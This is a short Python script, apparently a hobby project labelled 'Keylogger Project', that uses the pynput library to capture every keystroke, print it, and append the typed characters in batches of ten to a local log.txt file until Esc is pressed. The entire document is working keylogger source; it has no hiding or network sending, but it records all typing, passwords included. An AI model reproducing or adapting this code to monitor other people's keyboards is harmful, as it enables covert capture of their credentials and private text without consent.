# 7/15/21
# Keylogger Project
# Note: Must allow computer Input Access to PyCharm for KeyLogger to run program

# must upgrade pip and python for the import to work properly
import pynput

from pynput.keyboard import Key, Listener

count = 0 # every so many keys the text file will be updated
keys = []

# when a key is hit
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key)) # show which key is pressed

    if count >= 10: # every 10 keys the file will be updated
        count = 0   # restart count
        write_file(keys)
        keys = []

# connect to .txt file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","") # remove quotation marks from key logging log.txt file
            if k.find("space") > 0: # if space character shows more than zero times, write to file
                f.write('\n') # write new line everytime spacebar is hit
            elif k.find("Key") == -1: # if "find" can't find string, then returns direct value into file
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

# constantly run loop until broken out of join
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()